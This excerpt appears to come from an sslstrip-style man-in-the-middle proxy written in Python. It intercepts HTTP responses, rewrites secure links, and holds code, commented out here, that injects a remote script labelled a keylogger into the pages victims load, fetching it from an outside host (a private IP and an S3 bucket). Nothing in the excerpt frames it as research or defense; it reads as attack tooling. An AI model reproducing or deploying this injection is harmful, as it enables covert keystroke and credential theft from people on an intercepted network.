...
class ServerConnection(HTTPClient):
    ...
    tailExpression    = re.compile(r"</head>", re.IGNORECASE)
    ...
    def handleResponsePart(self, data):
        if (self.isImageRequest):
            ...
            if (self.injected == 0):
                #print "URL" + url
                #if (url == 'ampas.giantdev.com'):
                if '</head>' in data:
                    #data = re.sub('</head>','<script src="//10.0.1.4:3000/verth.js"></script></head>', data.rstrip())
                    self.injected = 1
                    #print '\n !!! ::_injected_keylogger_:: !!! \n'
    ...
    def handleResponse(self, data):
        ...
        # if (self.headers['host'] == 'brokenphone.com'):
        #     print(":::INJECTING KEYLOGGER:::")
        #     data = re.sub('</head>',
        #                 "<script src=\"//s3.amazonaws.com/dip.giantdev.com/sandbox/verth.js\"></script></head>", data)
    ...
    def replaceSecureLinks(self, data):
        ...
        for match in iterator:
            ...
            # print "\n Replacing %s with %s " % (secureURL, url)
